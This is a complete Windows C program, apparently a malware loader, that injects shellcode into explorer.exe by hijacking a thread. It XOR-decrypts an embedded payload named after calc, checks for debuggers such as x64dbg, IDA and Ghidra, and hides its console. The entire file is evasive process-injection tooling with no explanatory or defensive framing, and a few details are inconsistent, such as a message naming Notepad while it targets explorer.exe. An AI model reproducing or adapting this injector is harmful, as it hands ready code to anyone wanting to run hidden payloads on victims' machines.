#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>

unsigned char calc_payload[] = {0x91,0x31,0xf0,0x81,0x93,0x9a,0xa5,0x74,0x6b,0x65,0x24,0x34,0x2c,0x29,0x21,0x34,0x35,0x3a,0x54,0xa6,0xe,0x2d,0xee,0x37,0xd,0x31,0xf8,0x37,0x7b,0x3a,0xee,0x26,0x4b,0x2d,0xee,0x17,0x3d,0x31,0x7c,0xd2,0x29,0x38,0x28,0x45,0xa2,0x2d,0x54,0xa5,0xc1,0x45,0x12,0x19,0x61,0x5e,0x45,0x35,0xaa,0xac,0x68,0x24,0x6c,0xb8,0x91,0x88,0x31,0x33,0x34,0x3c,0xe0,0x37,0x45,0xee,0x2f,0x45,0x3b,0x64,0xb3,0xf9,0xe5,0xfc,0x6b,0x65,0x65,0x2d,0xe8,0xb9,0x7,0x2,0x2b,0x73,0xb5,0x24,0xe0,0x2d,0x7d,0x21,0xe6,0x39,0x53,0x2c,0x62,0xa2,0x86,0x22,0x23,0x9a,0xac,0x24,0xe6,0x4d,0xfb,0x2d,0x62,0xa4,0x28,0x45,0xa2,0x2d,0x54,0xa5,0xc1,0x38,0xb2,0xac,0x6e,0x33,0x64,0xb5,0x53,0x85,0x10,0x94,0x21,0x7a,0x3f,0x41,0x6b,0x37,0x5c,0xa5,0x1e,0xbd,0x3d,0x21,0xe6,0x39,0x57,0x2c,0x62,0xa2,0x3,0x35,0xe0,0x69,0x2d,0x21,0xe6,0x39,0x6f,0x2c,0x62,0xa2,0x24,0xff,0x6f,0xed,0x2d,0x64,0xbd,0x38,0x2b,0x24,0x3b,0x2c,0x3c,0x2e,0x2a,0x3d,0x24,0x3c,0x2c,0x23,0x3b,0xe6,0x8f,0x52,0x24,0x26,0x94,0x85,0x3d,0x24,0x34,0x23,0x3b,0xee,0x71,0x9b,0x32,0x8b,0x94,0x9a,0x38,0x2d,0xd7,0x78,0x73,0x65,0x63,0x72,0x65,0x74,0x6b,0x2d,0xe8,0xe8,0x6c,0x78,0x73,0x65,0x22,0xc8,0x54,0xff,0x4,0xe2,0x9a,0xb0,0xd6,0x89,0xc6,0xc7,0x35,0x33,0xdf,0xd2,0xfe,0xd8,0xf8,0x9a,0xb8,0x31,0xf0,0xa1,0x4b,0x4e,0x63,0x8,0x61,0xe5,0x9e,0x85,0x18,0x7c,0xc8,0x22,0x70,0x0,0xa,0x1e,0x6b,0x3c,0x24,0xec,0xb7,0x86,0xa6,0x6,0x2,0x1e,0x6,0x5a,0xe,0x1d,0x0,0x65};
unsigned int calc_len = sizeof(calc_payload);
const char* processesToCheck[] = {
    "x64dbg.exe",
    "ida.exe",
    "ghidra.exe",
    "DbgX.Shell.exe"
    
};
char key[] = "mysecretkeee";
	
BOOL (WINAPI *vp)(LPVOID lpAddress,SIZE_T dwSize,DWORD  flNewProtect,PDWORD lpflOldProtect);

bool ispsrunn(const char* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return false;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (strcmp(processName, pe32.szExeFile) == 0) {
                CloseHandle(hSnapshot);
                return true;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return false;
}

void XOR(char * data, size_t data_len, char * key, size_t key_len) {
	int j;
	
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}

HANDLE FindThread(int pid){

	HANDLE hThread = NULL;
	THREADENTRY32 thEntry;

	thEntry.dwSize = sizeof(thEntry);
    HANDLE Snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
		
	while (Thread32Next(Snap, &thEntry)) {
		if (thEntry.th32OwnerProcessID == pid) 	{
			hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, thEntry.th32ThreadID);
			break;
		}
	}
	CloseHandle(Snap);
	
	return hThread;
}
int FindTarget(const char *procname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
                
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!Process32First(hProcSnap, &pe32)) {
                CloseHandle(hProcSnap);
                return 0;
        }
                
        while (Process32Next(hProcSnap, &pe32)) {
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        CloseHandle(hProcSnap);
                
        return pid;
}
int InjectCTX(int pid, HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

	HANDLE hThread = NULL;
	LPVOID pRemoteCode = NULL;
	CONTEXT ctx;

	// find a thread in target process
	hThread = FindThread(pid);
	if (hThread == NULL) {
		return -1;
	}

	// Decrypt payload
	XOR((char *) calc_payload, calc_len, key, sizeof(key));	
	
	// perform payload injection
	pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	WriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);

	// execute the payload by hijacking a thread in target process
	SuspendThread(hThread);	
	ctx.ContextFlags = CONTEXT_FULL;
	GetThreadContext(hThread, &ctx);
#ifdef _M_IX86 
	ctx.Eip = (DWORD_PTR) pRemoteCode;
#else
	ctx.Rip = (DWORD_PTR) pRemoteCode;
#endif
	SetThreadContext(hThread, &ctx);
	
	return ResumeThread(hThread);	
}

int main(void) {
    
	void *exec_mem;
	BOOL rexec;
	HANDLE hProc = NULL;
	HANDLE th;
    DWORD oldprotect = 0;
    BOOL rv,pid;
     FreeConsole(); 
    int numProcesses = sizeof(processesToCheck) / sizeof(processesToCheck[0]);
    for (int i = 0; i < numProcesses; ++i) {
        if (ispsrunn(processesToCheck[i])) {
        int l=0;
            //return 0;
        }
    }

    FreeConsole();
	
    pid = FindTarget("explorer.exe");

	if (pid) {
		printf("Notepad.exe PID = %d\n", pid);

		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);

		if (hProc != NULL) {
			InjectCTX(pid, hProc, calc_payload, calc_len);
			CloseHandle(hProc);
		}
	}
	return 0;
	
}

